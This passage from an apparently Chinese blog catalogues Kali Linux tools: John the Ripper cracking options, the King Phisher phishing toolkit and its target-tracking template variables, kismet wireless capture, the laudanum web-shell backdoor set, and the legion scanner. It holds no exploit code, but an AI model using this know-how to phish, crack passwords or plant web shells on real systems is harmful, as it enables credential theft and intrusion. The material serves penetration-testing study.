述<br><br>--single<br><br>single crack 模式，使用配置文件中的规则进行破解<br><br>--wordlist=FILE--stdin<br><br>字典模式，从 FILE 或标准输入中读取词汇<br><br>--rules<br><br>打开字典模式的词汇表切分规则<br><br>--incremental[=MODE]<br><br>使用增量模式<br><br>--external=MODE<br><br>打开外部模式或单词过滤，使用 [List.External:MODE] 节中定义的外部函数<br><br>--stdout[=LENGTH]<br><br>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上<br><br>--restore[=NAME]<br><br>恢复被中断的破解过程，从指定文件或默认为 <span class="hljs-variable">$JOHN</span>/john.rec 的文件中读取破解过程的状态信息<br><br>--session=NAME<br><br>将新的破解会话命名为 NAME ，该选项用于会话中断恢复和同时运行多个破解实例的情况<br><br>--status[=NAME]<br><br>显示会话状态<br><br>--make-charset=FILE<br><br>生成一个字符集文件，覆盖 FILE 文件，用于增量模式<br><br>--show<br><br>显示已破解口令<br><br>--<span class="hljs-built_in">test</span><br><br>进行基准测试<br><br>--<span class="hljs-built_in">users</span>=[-]LOGIN|UID[,..]<br><br>选择指定的一个或多个账户进行破解或其他操作，列表前的减号表示反向操作，说明对列出账户之外的账户进行破解或其他操作<br><br>--<span class="hljs-built_in">groups</span>=[-]GID[,..]<br><br>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。<br><br>--shells=[-]SHELL[,..]<br><br>对使用指定 shell 的账户进行操作，减号表示反向操作<br><br>--salts=[-]COUNT<br><br>至少对 COUNT 口令加载加盐，减号表示反向操作<br><br>--format=NAME<br><br>指定密文格式名称，为 DES/BSDI/MD5/BF/AFS/LM 之一<br><br>--save-memory=LEVEL<br><br>设置内存节省模式，当内存不多时选用这个选项。 LEVEL 取值在 1~3 之间<br></code></pre></td></tr></table></figure><p>示例：</p><p><a href="https://blog.csdn.net/i_can1/article/details/107227565">https://blog.csdn.net/i_can1/article/details/107227565</a></p><h1 id="K"><a href="#K" class="headerlink" title="K"></a>K</h1><h2 id="Kali-Bugs"><a href="#Kali-Bugs" class="headerlink" title="Kali Bugs"></a>Kali Bugs</h2><h3 id="描述：-14"><a href="#描述：-14" class="headerlink" title="描述："></a>描述：</h3><p>探寻本地的kali日志\bugs还有全网讨论的kali bugs</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122026232.png" alt="image-20220412202630107" style="zoom:67%;" /><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122026159.png" alt="image-20220412202647011"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122027407.png" alt="image-20220412202716270"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122027819.png" alt="image-20220412202737706"><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220412202814444.png" alt="image-20220412202814444"></p><h2 id="Kali-Docs"><a href="#Kali-Docs" class="headerlink" title="Kali Docs"></a>Kali Docs</h2><h3 id="描述：-15"><a href="#描述：-15" class="headerlink" title="描述："></a>描述：</h3><p>kali官网</p><h3 id="参数：-9"><a href="#参数：-9" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122030750.png" alt="image-20220412203023606"></p><h2 id="Kali-linux"><a href="#Kali-linux" class="headerlink" title="Kali linux"></a>Kali linux</h2><h3 id="描述：-16"><a href="#描述：-16" class="headerlink" title="描述："></a>描述：</h3><p>kali官网</p><h3 id="参数：-10"><a href="#参数：-10" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122030245.png" alt="image-20220412203053910"></p><h2 id="Kali-HiDPI-Mode"><a href="#Kali-HiDPI-Mode" class="headerlink" title="Kali HiDPI Mode"></a>Kali HiDPI Mode</h2><h3 id="描述：-17"><a href="#描述：-17" class="headerlink" title="描述："></a>描述：</h3><p>使用hidpi 也就是本机电脑的分辨率</p><h3 id="参数：-11"><a href="#参数：-11" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122033905.png" alt="image-20220412203323675"></p><p>看 变得这么大</p><h2 id="Kali-Tools"><a href="#Kali-Tools" class="headerlink" title="Kali Tools"></a>Kali Tools</h2><h3 id="描述：-18"><a href="#描述：-18" class="headerlink" title="描述："></a>描述：</h3><p>kali工具指南</p><h3 id="参数：-12"><a href="#参数：-12" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122034182.png"></p><h2 id="Kali-Undercover-Mode"><a href="#Kali-Undercover-Mode" class="headerlink" title="Kali Undercover Mode"></a>Kali Undercover Mode</h2><h3 id="描述：-19"><a href="#描述：-19" class="headerlink" title="描述："></a>描述：</h3><p>kali 变成windows版</p><h3 id="参数：-13"><a href="#参数：-13" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122037978.png" alt="image-20220412203706628"></p><p>这个好用啊</p><h2 id="Kazam"><a href="#Kazam" class="headerlink" title="Kazam"></a>Kazam</h2><h3 id="描述：-20"><a href="#描述：-20" class="headerlink" title="描述："></a>描述：</h3><p>屏幕录像 截图工具</p><h3 id="参数：-14"><a href="#参数：-14" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122046749.png" alt="image-20220412204552308"></p><h2 id="King-Phisher-未完成"><a href="#King-Phisher-未完成" class="headerlink" title="King Phisher(未完成)"></a>King Phisher(未完成)</h2><h3 id="描述：-21"><a href="#描述：-21" class="headerlink" title="描述："></a>描述：</h3><p>King Phisher是一款多功能的钓鱼活动工具包，无论你想将其用于教育目的还是窃取用户的凭证数据，King Phisher都可以帮助你实现你的目标。只需要进行简单的配置，King Phisher就可以帮你同时对成百上千个发动网络钓鱼攻击。除此之外，它还允许我们在消息中嵌入恶意图像文件。</p><p>整合了Web服务器</p><p>King Phisher内置封装了Web服务器，并默认支持标准Python环境。</p><p>开源</p><p>采用Python开发的King Phisher意味着任何用户都可以根据自己的需要来修改其源代码，感兴趣或有能力的用户也可以去该项目的GitHub库贡献自己的力量【地址请查看原文】。</p><p>不提供Web接口</p><p>没有Web接口意味着他人更加难以识别King Phisher用于进行社会工程学活动的服务器了，与此同时，这也降低了King Phisher操作者遇到类似XSS这种Web漏洞的可能性。</p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例:"></a>示例:</h3><p>客户端配置</p><p>客户端配置文件采用JSON编码格式，其中绝大多数配置项都可以通过GUI界面完成设置。</p><p>下列选项用户可以自行修改，但无法通过GUI界面配置：</p><p>gui.refresh_frequency(默认: 5 分钟)mailer.max_messages_per_connection(默认: 5)rpc.serializer(默认: 自动选择)ssh_preferred_key(默认: N&#x2F;A) 消息模板变量</p><p>客户端消息模板使用的是Jinja2模板引擎，主要支持以下几种变量：</p><table><thead><tr><th>client.company_name</th><th>目标用户所在公司名称</th></tr></thead><tbody><tr><td>client.email_address</td><td>目标用户的邮箱地址</td></tr><tr><td>client.first_name</td><td>目标用户的名</td></tr><tr><td>client.last_name</td><td>目标用户的姓</td></tr><tr><td>client.message_id</td><td>跟踪标识符（与uid相同）</td></tr><tr><td>url.tracking_dot</td><td>用于追踪消息的图片URL</td></tr><tr><td>url.webserver</td><td>带有uid参数的钓鱼服务器URL</td></tr><tr><td>url.webserver_raw</td><td>不带参数的钓鱼服务器URL</td></tr><tr><td>tracking_dot_image_tag</td><td>img标签中的跟踪图像</td></tr><tr><td>uid</td><td>跟踪标识符（与client.message_id相同）</td></tr></tbody></table><p>注:其中，uid是最重要的一个参数，必须在消息链接中包含uid。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122052937.png" alt="image-20220412205244759"></p><p>服务端:</p><h2 id="kismet"><a href="#kismet" class="headerlink" title="kismet"></a>kismet</h2><h3 id="描述：-22"><a href="#描述：-22" class="headerlink" title="描述："></a>描述：</h3><p>kismet工具，是一个无线扫描工具，该工具通过测量周围的无线信号，可以扫描到周围附近所用可用的Ap，以及信道等信息。同时还可以捕获网络中的数据包到一个文件中。这样可以方便分析数据包。下面我将详细的介绍kismet 使用的每个步骤。为后续分析数据包打下基础。</p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例:"></a>示例:</h3><p>首先插入无线网卡，开启监听模式（混杂模式）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122108669.png" alt="image-20220412210801528"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122108181.png" alt="image-20220412210819050"></p><p>打开网址<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122109002.png" alt="image-20220412210903897"></p><p>启动kismet服务<img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTcxMjA3NTQ2LTg4MzMyMDQ4OS5wbmc=.jpg" alt="img"></p><p>kismet默认服务配置，这里直接点击start即可。之后显示的被定义的资源包，点击yES即可<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122111282.png" alt="image-20220412211131167"></p><p>下面显示的是无线网卡配置接口信息，当无线网卡已经启动混杂模式的时候，直接输入wlan0 或者mon0.其他配置可以不用管，之后单击添加ADD，（注：如果监听模式下名字改变，使用自己无线网卡改变后的名字想我的是 wlan0mon）</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTcxODU1NTcwLTExMTAzMzAzNjkucG5n.jpg" alt="img"></p><p>之后进入到扫描周围无线SSID，可以使用工具命令查看某个SSID的详细信息</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTcyMzQ0MDM3LTEyMTc3MTA2OS5wbmc=.jpg" alt="img"></p><p>查看SSID链接的客户端信息，可以使用Sort&#x2F;first SEEN</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTcyNjM5ODc5LTgxOTQxODA2Ny5wbmc=.jpg" alt="img"></p><p>查看ssid的详细信息 选中后回车即可</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTcyOTE5MzYwLTE0MTk0MTE5MjkucG5n.jpg" alt="img">退出kismet之后 终端先显示一些日志信息</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTczMzU4OTU5LTE4NTMxMjUzMzcucG5n.jpg" alt="img"></p><p>最后查看生成的日志文件</p><p>每一次扫描都会生成五个文件，文件的后缀名都不同，每个文件都记录不同的日志</p><p>alert: 该文件中所用的警告信息</p><p>gpsxml:如果使用了GPS源，则相关的GPS数据保存在这个文件当中。</p><p>nettxt:包括收集的文本信息</p><p>netxml:包括XML格式的数据</p><p>pcapdump：包括整个会话中捕获的数据</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjc2OTA0LzIwMTgwNi8xMjc2OTA0LTIwMTgwNjI4MTczNjI0NjYzLTEwNjY2NDM4MTYucG5n.jpg" alt="img"></p><h1 id="L"><a href="#L" class="headerlink" title="L"></a>L</h1><h2 id="laudanum"><a href="#laudanum" class="headerlink" title="laudanum"></a>laudanum</h2><h3 id="描述：-23"><a href="#描述：-23" class="headerlink" title="描述："></a>描述：</h3><p>laudanum是Kali Linux预先安装的Web Shell工具。它支持多种Web后台技术，如ASP、  ASP.net  、JSP、PHP、Coldfusion。它提供的后门可以提供DNS、文件系统、代理和Shell的访问。同时，它还针对WordPress搭建的网站，提供封装好的插件。渗透测试人员可以直接通过WordPress插件功能，实现后门的植入，并对服务器进行控制。</p><p>Laudanum 是一个可注入文件的集合，旨在在发现 SQL 注入缺陷时用于渗透测试，并针对不同环境提供多种语言。它们提供 shell、DNS 查询、LDAP 检索等功能。</p><h3 id="参数：-15"><a href="#参数：-15" class="headerlink" title="参数："></a>参数：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122218832.png" alt="image-20220412221846722"></h3><p>这就是个集合包</p><h2 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a>lbd</h2><h3 id="描述：-24"><a href="#描述：-24" class="headerlink" title="描述："></a>描述：</h3><p><a href="https://so.csdn.net/so/search?q=%E8%B4%9F%E8%BD%BD%E5%B9%B3%E8%A1%A1&spm=1001.2101.3001.7020">负载平衡</a>检测器0.4-检查给定的域是否使用负载平衡。</p><h3 id="参数：-16"><a href="#参数：-16" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>等效于-v -t ANY<br><br>-A<br>就像-a一样，但是省略了RRSIG，NSEC，NSEC3<br><br>-c<br>指定非IN数据的查询类<br><br>-C<br>比较权威名称服务器上的SOA记录<br><br>-d<br>等效于-v<br><br>-l<br>使用AXFR列出域中的所有主机<br><br>-m<br>设置内存调试标志（跟踪|记录|使用）<br><br>-N<br>更改在查找根之前允许的点数<br><br>-p<br>指定服务器上要查询的端口<br><br>-r<br>禁用递归处理<br><br>-R<br>指定UDP数据包的重试次数<br><br>-s<br>SERVFAIL响应应停止查询<br><br>-t<br>指定查询类型<br><br>-T<br>启用TCP / IP模式<br><br>-U<br>启用UDP模式<br><br>-v<br>启用详细输出<br><br>-V<br>打印版本号并退出<br><br>-w<br>指定永久等待应答<br><br>-W<br>指定等待回复的时间<br><br>-4<br>仅使用IPv4查询传输<br><br>-6<br>仅使用IPv6查询传输<br></code></pre></td></tr></table></figure><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p>测试baidu.com的http的负载均衡，发现负载均衡，发现方式;DNS,HTTP[Diff]</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122227603.png" alt="image-20220412222702466"></p><p>测试https的负载均衡</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122227157.png" alt="image-20220412222749011"></p><h2 id="legion"><a href="#legion" class="headerlink" title="legion"></a>legion</h2><h3 id="描述：-25"><a href="#描述：-25" class="headerlink" title="描述："></a>描述：</h3><p>Legion是SECFORCE的Sparta的分支，是一个开源，易于使用，超扩展和半自动化的网络渗透测试框架，针对发现，侦察和利用漏洞的信息系统。 Legion由GoVanguard开发和维护。有关军团的更多信息，包括产品路线图，可以在其项目页面上找到，网址为<a href="https://govanguard.com/legion%E3%80%82">https://GoVanguard.com/legion。</a><br>特点<br>使用NMAP，whataweb，nikto，Vulners，Hydra，SMBenum，dirbuster，sslyzer，webslayer等进行自动侦查和扫描（具有近100个自动调度的脚本）<br>方便使用的图形界面，丰富的上下文菜单和面板，可让渗透测试人员快速找到和利用主机上的攻击媒介<br>模块化功能使用户可以轻松自定义Legion并自动调用自己的脚本&#x2F;工具<br>高度可定制的阶段扫描，可实现类似ninja的IPS逃避<br>自动检测CPE（通用平台枚举）和CVE（通用漏洞和披露）<br>将CVE与要利用的漏洞绑定，如Exploit-Database中所述<br>实时自动保存项目结果和任务</p><h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例:"></a>示例:</h3><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>kali终端直接输入legion即可启动</p><h2 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h2><p>下图中填写的目标可为ip、可为网段、也可为域。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.1.0/24<br>10.10.10.10-20<br>1.2.3.4<br>bing.com<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122234304.png" alt="image-20220412223448019">查看结果</p><p>选择完目标后，legion会自动调动脚本进行扫描，这时候只需要等待结果即可，每扫描除一个结果便会下下图标示区域显示</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122235098.png" alt="image-20220412223543419">端口开放的服务</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122236033.png" alt="image-20220412223600920"></p><p>目标基本信息</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122236422.png" alt="image-20220412223621425">可能存在的漏洞以及威胁度</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122236060.png" alt="image-20220412223652945"></p><h2 id="LightDM-桌面管理器-GTK-界面-设置"><a href="#LightDM-桌面管理器-GTK-界面-设置" class="headerlink" title="LightDM 桌面管理器(GTK+界面)设置"></a>LightDM 桌面管理器(GTK+界面)设置</h2><h3 id="描述：-26"><a href="#描述：-26" class="headerlink" title="描述："></a>描述：</h3><p>显示管理器 (display manager) （DM）是一个为你的Linux发行版提供图形登录功能的程序。它控制用户会话并管理用户认证。显示管理器会在你输入用户名和密码后，立即启动显示服务器并加载桌面环境。</p><h3 id="参数：-17"><a href="#参数：-17" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122239291.png"></p><h1 id="N"><a href="#N" class="headerlink" title="N"></a>N</h1><h2 id="NASM-shell"><a href="#NASM-shell" class="headerlink" title="NASM shell"></a>NASM shell</h2><h3 id="描述：-27"><a href="#描述：-27" class="headerlink" title="描述："></a>描述：</h3><p>逆向工具</p><p>Netwide Assembler NASM是一个80x86和x86-64汇编器，专为便携性和可扩展性而设计模块化。 它支持一系列的目标文件格式，包括Linux和* BSD a.out，ELF，COFF，Mach-O，16位和32位OBJ（OMF）格式，Win32和Win64。 它也会输出纯二进制文件，Intel十六进制和Motorola S-Record格式。 其语法设计简单易懂，类似于“英特尔软件开发人员手册”中的语法，其复杂程度极低 它支持所有目前已知的x86架构扩展，并且对宏有强大的支持。</p><h3 id="参数：-18"><a href="#参数：-18" class="headerlink" title="参数："></a>参数：</h3><p>组装一个文件，你发出一个窗体的命令</p><p>nasm −f <format> <filename> [−o <output>]</p><p>nasm -f &lt;格式&gt; &lt;文件名&gt; [-o &lt;输出&gt;]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><code class="hljs bash">-o 选项：指定输出文件名称<br><br>NASM通常会为您选择输出文件的名称;这究竟是如何依赖的关于对象文件格式。对于Microsoft目标文件格式（obj，win32和win64），它将删除.asm扩展名（或任何你喜欢使用的扩展名--NAMM不关心）从你的源文件名并替换.obj。对于Unix对象文件格式（aout，as86，coff，elf32，elf64，elfx32，ieee，macho32和macho64）将替代.o。对于dbg，rdf，ith和srec，它将使用.dbg，.rdf，.ith和.srec，并且对于bin格式，它将简单地删除扩展名，这样myfile.asm生成输出文件myfile。<br><br>如果输出文件已经存在，则NASM将覆盖它，除非它与输入文件具有相同的名称这种情况下会给出警告，并使用nasm.out作为输出文件名。对于这种行为不可接受的情况，NASM提供-o命令行选项，它允许你指定你想要的输出文件名。您通过跟随名称来调用-o您希望输出文件，无论有无间隔空间。例如：<br><br>nasm -f bin program.asm -o program.com<br>nasm -f bin driver.asm -odriver.sys<br>请注意，这是一个小的o，并且不同于大写字母O，它用于指定数量需要优化通行证。<br><br> <br><br>-f 选项：指定输出文件格式<br><br>如果你不提供-f选项给NASM，它会为你自己选择一个输出文件格式。 在里面NASM的分发版本，默认是bin。 如果你编译了自己的NASM副本，你可以在编译时重新定义OF_DEFAULT，并选择你想要的默认。<br><br>与-o一样，-f和输出文件格式之间的中间空格是可选的; 所以 −f elf和−felf都是有效的。可用输出文件格式的完整列表可以通过发出命令nasm -hf来给出；<br><br> <br><br>-l 选项：生成列表文件<br><br>如果您向NASM提供-l选项，请按照（通常的可选空间）文件名，NASM将会为您生成一个源代码文件，其中的地址和生成的代码在左边列出实际的源代码，多线宏的扩展（除了那些特别要求的在源列表中没有扩展：见4.3.11节）。 例如：<br><br>nasm -f elf myfile.asm -l myfile.lst<br>如果选择了一个列表文件，你可以用[list - ]关闭源文件的列表，然后把它关掉回到[list +]，（默认，显然）。 没有“用户表单”（没有括号）。 这个可以用来列出仅感兴趣的部分，避免过长的列表。<br><br> <br><br>-M 选项：生成Makefile依赖项<br><br>这个选项可以用来生成stdout的makefile依赖关系。 这可以重定向到一个文件进一步处理。 例如：<br><br>nasm -M myfile.asm&gt; myfile.dep<br> <br><br>-MG 选项：生成Makefile依赖项<br><br>这个选项可以用来生成stdout的makefile依赖关系。 这与-M选项不同如果遇到一个不存在的文件，它被认为是一个生成的文件，并被添加到依赖列表没有前缀。<br><br> <br><br>-MF 选项：设置Makefile依赖项文件<br><br>此选项可与-M或-MG选项一起使用，以将输出发送到文件，而不是标准输出。例如：<br><br>nasm -M -MF myfile.dep myfile.asm<br> <br><br>-MD 选项：组装并生成相关性<br><br>-MD选项充当-M和-MF选项的组合（即，必须指定文件名）。但是，与-M或-MG选项不同，-MD不禁止汇编程序的正常操作。使用它来自动生成更新的每个程序集会话的依赖关系。 例如：<br><br>nasm -f elf -o myfile.o -MD myfile.dep myfile.asm<br> <br><br>-MT 选项：依赖目标名称<br><br>-MT选项可用于覆盖依赖目标的默认名称。 这通常是与由-o选项指定的输出文件名相同。<br><br> <br><br>-MQ 选项：依赖目标名称（引用）<br><br>-MQ选项作为-MT选项，除了试图引用在其中有特殊含义的字符Makefile语法。 这并非万无一失，因为并不是所有有特殊含义的人物都可以在Make中引用。默认输出（如果没有指定-MT或-MQ选项）会被自动引用。<br><br> <br><br>-MP 选项：发出假目标<br><br>与任何依赖关系生成选项一起使用时，-MP选项会导致NASM发出一个假的目标没有依赖每个头文件。 这可以防止从抱怨，如果一个头文件已被删除。<br><br> <br><br>-MW 选项：Watcom引用引用样式<br><br>这个选项会导致NASM尝试根据Watcom Make约定引用依赖关系而不是POSIX Make约定（也被大多数其他Make变体使用）。这引号＃为$＃而不是\＃，使用＆而不是\作为连续行，并且包含文件名双引号中的空格。<br><br> <br><br>-F 选项：选择调试信息格式<br><br>这个选项用来选择发送到输出文件的调试信息的格式由调试器（或将）使用。 在版本2.03.01之前，使用这个开关并没有启用输出选定的调试信息格式。 使用-g，启用输出。 版本2.03.01和更高版本如果指定-F，则自动启用-g。输出格式的可用调试文件格式的完整列表可以通过发出命令nasm -f &lt;format&gt; -y。 并不是所有的输出格式都支持调试输出。<br><br> <br><br>-g 